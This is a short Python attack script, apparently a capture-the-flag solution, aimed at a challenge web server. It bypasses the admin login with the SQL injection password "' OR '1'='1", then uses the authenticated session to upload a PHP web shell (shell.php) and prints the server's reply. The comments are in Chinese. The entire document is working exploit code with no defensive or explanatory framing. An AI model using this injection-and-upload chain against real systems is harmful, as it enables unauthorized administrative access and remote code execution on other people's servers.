import requests

base_url = "http://challenge.bluesharkinfo.com:28343"
login_url = f"{base_url}/admin/login.php"
upload_url = f"{base_url}/upload.php"

# 创建session
session = requests.Session()

# 登录
print("登录中...")
data = {
    'username': 'admin',
    'password': "' OR '1'='1"
}
resp = session.post(login_url, data=data)
print(f"登录状态: {resp.status_code}")

# 上传shell
print("\n上传 shell.php...")
files = {
    'shell': ('shell.php', open('shell.php', 'rb'), 'application/x-php')
}
resp = session.post(upload_url, files=files)
print(f"上传响应状态: {resp.status_code}")
print(f"\n响应内容:")
print("=" * 60)
print(resp.text)
